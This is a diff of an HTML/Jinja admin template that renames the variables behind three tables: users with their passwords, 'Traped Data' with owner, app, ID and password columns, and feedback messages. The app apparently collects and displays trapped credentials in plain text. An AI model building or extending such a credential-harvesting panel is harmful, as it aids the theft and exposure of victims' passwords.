@@ -23,59 +23,62 @@
     }">Logout</button>
 <br>
 
-    <table style="width:100%">
-        Total number of Users={{allData.getUserData()[1]}}
-        <tr>
-          <th>UId</th>
-          <th>email</th>
-          <th>Password</th>
-        </tr>
-        {% for row in allData.getUserData()[0] %}
-        <tr>
-          <td>{{row[0]}}</td>
-          <td>{{row[1]}}</td>
-          <td>{{row[2]}}</td>
-        </tr>
-        {% endfor %}
-      </table>
+<table style="width:100%">
+  Total number of Users={{ users[1] }}
+  <tr>
+    <th>UId</th>
+    <th>email</th>
+    <th>Password</th>
+  </tr>
+  {% for row in users[0] %}
+  <tr>
+    <td>{{ row[0] }}</td>
+    <td>{{ row[1] }}</td>
+    <td>{{ row[2] }}</td>
+  </tr>
+  {% endfor %}
+</table>
+
 <br>
 
-    <table style="width:100%">
-        Total number of Traped Data={{allData.getTrapedData()[1]}}
-        <tr>
-          <th>Owner</th>  
-          <th>App</th>
-          <th>Id</th>
-          <th>Password</th>
-        </tr>
-        {% for row in allData.getTrapedData()[0] %}
-        <tr>
-          <td>{{row[0]}}</td>
-          <td>{{row[1]}}</td>
-          <td>{{row[2]}}</td>
-          <td>{{row[3]}}</td>
-        </tr>
-        {% endfor %}
-      </table>
+<table style="width:100%">
+  Total number of Traped Data={{ traps[1] }}
+  <tr>
+    <th>Owner</th>
+    <th>App</th>
+    <th>Id</th>
+    <th>Password</th>
+  </tr>
+  {% for row in traps[0] %}
+  <tr>
+    <td>{{ row[0] }}</td>
+    <td>{{ row[1] }}</td>
+    <td>{{ row[2] }}</td>
+    <td>{{ row[3] }}</td>
+  </tr>
+  {% endfor %}
+</table>
+
 <br>
 
-      <table style="width:100%">
-        Total number of Feedback={{allData.getFeedbackData()[1]}}
-        <tr>
-          <th>UId</th>  
-          <th>Name</th>
-          <th>Email</th>
-          <th>Message</th>
-        </tr>
-        {% for row in allData.getFeedbackData()[0] %}
-        <tr>
-          <td>{{row[0]}}</td>
-          <td>{{row[1]}}</td>
-          <td>{{row[2]}}</td>
-          <td>{{row[3]}}</td>
-        </tr>
-        {% endfor %}
-      </table>
+<table style="width:100%">
+  Total number of Feedback={{ feedback[1] }}
+  <tr>
+    <th>UId</th>
+    <th>Name</th>
+    <th>Email</th>
+    <th>Message</th>
+  </tr>
+  {% for row in feedback[0] %}
+  <tr>
+    <td>{{ row[0] }}</td>
+    <td>{{ row[1] }}</td>
+    <td>{{ row[2] }}</td>
+    <td>{{ row[3] }}</td>
+  </tr>
+  {% endfor %}
+</table>
+
 
     
 </body>
